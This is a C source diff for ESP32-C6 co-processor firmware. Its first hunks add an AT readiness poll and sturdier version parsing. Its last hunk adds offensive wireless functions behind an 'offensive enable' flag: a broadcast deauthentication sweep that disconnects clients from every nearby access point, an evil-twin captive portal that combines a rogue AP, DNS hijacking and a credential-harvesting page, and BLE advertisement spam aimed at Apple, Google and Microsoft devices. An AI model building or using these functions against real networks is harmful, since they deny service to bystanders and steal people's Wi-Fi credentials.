@@ -710,6 +710,35 @@ static void reset_slave(void)
 }
 
 
+/**
+  * @brief  Poll the AT interface until the ESP32-C6 responds, or give up.
+  *
+  * After a reset the C6 needs well over the 200ms settle before it will
+  * accept SPI AT commands. Callers that fire a command immediately (BT Info's
+  * AT+GMR, Bluetooth Advertise / Bad-BT's AT+BLEINIT) otherwise race the boot
+  * and get a timeout — seen as a frozen/"Unknown"/failed screen. WiFi attacks
+  * happen to work only because the user navigates for a moment first, giving
+  * the C6 time to come up. This makes that readiness explicit.
+  *
+  * @param  max_tries  number of ~150ms attempts (e.g. 20 ≈ 3s)
+  * @retval true if the C6 answered "OK", false if it never did
+  */
+static bool esp_wait_at_ready(int max_tries)
+{
+	char resp[64];
+
+	for (int i = 0; i < max_tries; i++)
+	{
+		if (spi_AT_send_recv("AT\r\n", resp, sizeof(resp), 1) == SUCCESS &&
+			strstr(resp, "OK"))
+		{
+			return true;
+		}
+		HAL_Delay(150);
+	}
+	return false;
+}
+
 
 void esp32_main_init(void)
 {
@@ -736,6 +765,12 @@ void esp32_main_init(void)
 	}
 
 	esp32_main_init_done = true;
+
+	/* Wait until the C6 actually answers AT before returning, so the first
+	 * command from any caller doesn't race the slave's boot. */
+	if (!esp_wait_at_ready(25)) {
+		M1_LOG_E(TAG, "esp32_main_init: C6 not responding to AT after reset\r\n");
+	}
 } // void app_main(void)
 
 
@@ -1042,7 +1077,10 @@ uint8_t esp_get_version(ctrl_cmd_t *app_req)
 		app_req->u.wifi_ap_config.status[i] = '\0';
 	}
 
-	if ( strstr(resp, "OK") )
+	/* Treat a parsed "AT version:" line as success even if the trailing
+	 * "OK" landed in a SPI chunk we didn't capture — the version is what
+	 * matters, and AT+GMR's multi-line reply can split awkwardly. */
+	if ( strstr(resp, "OK") || app_req->u.wifi_ap_config.status[0] != '\0' )
 	{
 		app_req->msg_type = CTRL_RESP;
 		app_req->resp_event_status = SUCCESS;
@@ -1478,6 +1516,10 @@ uint8_t esp_dev_reset(ctrl_cmd_t *app_req)
 	                       resp, sizeof(resp), timeout);
 	if (ret == SUCCESS && (strstr(resp, "ready") || strstr(resp, "OK")))
 	{
+		/* "OK" is emitted before the reboot finishes; wait for the C6 to
+		 * actually come back up so the caller's next command (e.g.
+		 * AT+BLEINIT for advertise) doesn't race the reboot. */
+		esp_wait_at_ready(25);
 		app_req->msg_type = CTRL_RESP;
 		app_req->resp_event_status = SUCCESS;
 		M1_LOG_I(TAG, "esp_dev_reset: SUCCESS\r\n");
@@ -2134,6 +2176,73 @@ uint8_t wifi_esp_hscap_start(const char *bssid, uint8_t channel, uint16_t deauth
 	snprintf(cmd, sizeof(cmd), "%s\"%s\",%u,%u\r\n",
 			 ESP32C6_AT_REQ_HSCAP, bssid, channel, deauth_count);
 	return wifi_esp_run_simple_cmd(cmd, 35, resp, sizeof(resp));
+}
+
+/* Broadcast deauth sweep: ESP scans, then deauths every AP found. */
+uint8_t wifi_esp_deauth_all_start(void)
+{
+	char resp[256];
+
+	/* Generous timeout: the ESP runs a blocking scan before it starts. */
+	return wifi_esp_run_simple_cmd(CONCAT_CMD_PARAM(ESP32C6_AT_REQ_DEAUTH_ALL, ""),
+								   15, resp, sizeof(resp));
+}
+
+uint8_t wifi_esp_deauth_all_stop(void)
+{
+	char resp[256];
+
+	if (wifi_esp_run_simple_cmd(CONCAT_CMD_PARAM(ESP32C6_AT_REQ_DEAUTH_STOP, ""), 5, resp, sizeof(resp)) != SUCCESS)
+	{
+		return ERROR;
+	}
+
+	return wifi_esp_run_simple_cmd(CONCAT_CMD_PARAM(ESP32C6_AT_REQ_MONITOR, "0"), 5, resp, sizeof(resp));
+}
+
+/* Evil-twin captive portal: open rogue AP + DNS hijack + credential page. */
+uint8_t wifi_esp_eviltwin_start(const char *ssid, uint8_t channel)
+{
+	char cmd[96];
+	char resp[256];
+
+	if (ssid == NULL || ssid[0] == '\0' || channel < 1U || channel > 14U)
+	{
+		return ERROR;
+	}
+
+	snprintf(cmd, sizeof(cmd), "%s1,\"%s\",%u\r\n",
+			 ESP32C6_AT_REQ_EVILTWIN, ssid, channel);
+	return wifi_esp_run_simple_cmd(cmd, 8, resp, sizeof(resp));
+}
+
+uint8_t wifi_esp_eviltwin_stop(void)
+{
+	char resp[256];
+
+	return wifi_esp_run_simple_cmd(CONCAT_CMD_PARAM(ESP32C6_AT_REQ_EVILTWIN, "0"), 5, resp, sizeof(resp));
+}
+
+/* BLE advertisement spam. mode bitmask: 1=Apple 2=Google 4=Microsoft. */
+uint8_t ble_esp_spam_start(uint8_t mode)
+{
+	char cmd[48];
+	char resp[256];
+
+	if (mode == 0U)
+	{
+		mode = 0x07U; /* all */
+	}
+
+	snprintf(cmd, sizeof(cmd), "%s%u\r\n", ESP32C6_AT_REQ_BLE_SPAM, mode);
+	return wifi_esp_run_simple_cmd(cmd, 8, resp, sizeof(resp));
+}
+
+uint8_t ble_esp_spam_stop(void)
+{
+	char resp[256];
+
+	return wifi_esp_run_simple_cmd(CONCAT_CMD_PARAM(ESP32C6_AT_REQ_BLE_SPAM, "0"), 5, resp, sizeof(resp));
 }
 
 #endif /* M1_APP_WIFI_OFFENSIVE_ENABLE */
